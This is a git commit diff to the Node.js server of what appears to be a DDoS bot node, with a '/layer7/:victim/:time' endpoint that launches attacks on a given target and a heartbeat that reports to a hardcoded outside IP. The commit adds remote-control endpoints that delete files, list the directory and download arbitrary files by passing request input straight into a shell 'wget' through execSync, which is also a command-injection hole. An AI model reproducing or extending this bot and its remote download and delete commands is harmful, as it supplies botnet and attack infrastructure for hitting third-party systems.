cfdc9e2b1f0f179c696503964d72b403a9bfd8b6
Mehmet Efe Erkan <69371881+mehmetefeerkan@users.noreply.github.com>
2021-05-31 15:44:22 +0300

    Enable directory listing and file downloads

--- source/index.js
+++ source/index.js
@@ -6,19 +6,22 @@ const axios = require('axios')
 const lockdown = false
 const port = 3000 // access port
 const managerIP = "" //only IP that can send commands in if lockdown === true.
+var http = require('http')
+var fs = require('fs')
+
 
 let machineBusy = false //machine attack state declaration
 let pythonActive = false //python state declaration
 let python = null //defining python beforehand so we can change it afterwards
 
 
-function inithb(){
-    var options = {method: 'POST', url: 'http://18.193.150.142:30120/hb/'};
+function inithb() {
+    var options = { method: 'POST', url: 'http://18.193.150.142:30120/hb/' };
 
     axios.request(options).then(function (response) {
-      console.log(response.data);
+        console.log(response.data);
     }).catch(function (error) {
-      console.error(error);
+        console.error(error);
     });
 }
 inithb()
@@ -47,13 +50,56 @@ app.get('/layer7/:victim/:time', (req, res) => {
         else {
             mainT(victim, timelimit)
             machineBusy = true
-            res.send(200, {success: `Attacking ${victim} with TL ${timelimit}`})
+            res.send(200, { success: `Attacking ${victim} with TL ${timelimit}` })
         }
     }
     else {
         res.send(405, { error: "MACHINE_IS_BUSY" })
     }
 })
+
+
+
+
+app.get('/remfile/:valx/', (req, res) => {
+
+    const path = './' + req.params.valx
+
+    try {
+        fs.unlinkSync(path)
+        res.send(200)
+    } catch (err) {
+        res.send(500, { err })
+    }
+
+})
+
+app.get('/addfile/:fin/:exn/', (req, res) => {
+    let cp = require('child_process')
+    let filn = ((req.params.fin).replace(/ç/g, "/"))
+    let exn = req.params.exn
+    let download = async function (filename) {
+        let command = `wget ${filename}`;
+        let result = cp.execSync(command);
+    };
+    async function test(filn) {
+        await download(filn)
+    }
+    test(filn)
+    res.send(200)
+})
+
+app.get('/listdir/', (req, res) => {
+    let folderarr = []
+    const testFolder = './';
+    const fs = require('fs');
+
+    fs.readdirSync(testFolder).forEach(file => {
+        folderarr.push(file)
+    });
+    res.send(200, { folderarr })
+})
+
 
 app.get('/layer7stop/', (req, res) => {
     if (pythonActive) {
@@ -88,6 +134,5 @@ async function mainT(victim, time) {
 
 app.listen(port, () => console.log(`App listening on port
 ${port}!`))
-
 
 
